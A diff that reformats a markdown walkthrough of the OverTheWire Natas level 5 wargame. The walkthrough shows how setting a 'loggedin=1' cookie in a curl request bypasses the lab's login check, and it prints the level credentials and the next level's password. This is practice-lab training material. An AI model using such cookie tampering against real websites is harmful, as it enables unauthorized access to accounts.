@@ -14,9 +14,7 @@ Access `http://natas5.natas.labs.overthewire.org` and retrieve the password to a
 ## 🔎 ANALYSIS
 
 - After logging in with the correct credentials, the website shows the following message:
-
-  > **Access denied. You are not logged in.**
-
+**Access denied. You are not logged in.**
 - The page source contains no useful information, so we inspect the HTTP request via the browser's DevTools.
 - Under the **Cookies** section, a flag draws our attention: `loggedin=0`. This indicates that the session is not authenticated.
 - What happens if we change that value?
@@ -30,9 +28,9 @@ Access `http://natas5.natas.labs.overthewire.org` and retrieve the password to a
 3. Using the terminal, we craft a request with a modified cookie header:
 
 ```
-   curl http://natas5.natas.labs.overthewire.org/ \
-     -u natas5:0n35PkggAPm2zbEpOU802c0x0Msn1ToK \
-     -H "Cookie: _ga=GA1.1.325147876.1747444879; _ga_RD0K2239G0=GS2.1.s1748038204\$o13\$g1\$t1748038952\$j0\$l0\$h0; loggedin=1"
+curl http://natas5.natas.labs.overthewire.org/ \  
+-u natas5:0n35PkggAPm2zbEpOU802c0x0Msn1ToK \  
+-H "Cookie: _ga=GA1.1.325147876.1747444879; _ga_RD0K2239G0=GS2.1.s1748038204\$o13\$g1\$t1748038952\$j0\$l0\$h0; loggedin=1"  
 ```
 4. Upon execution, the response is: `Access granted. The password for natas6 is 0RoJwHdSKWFTYR5WuiAewauSuNaBXned`
 
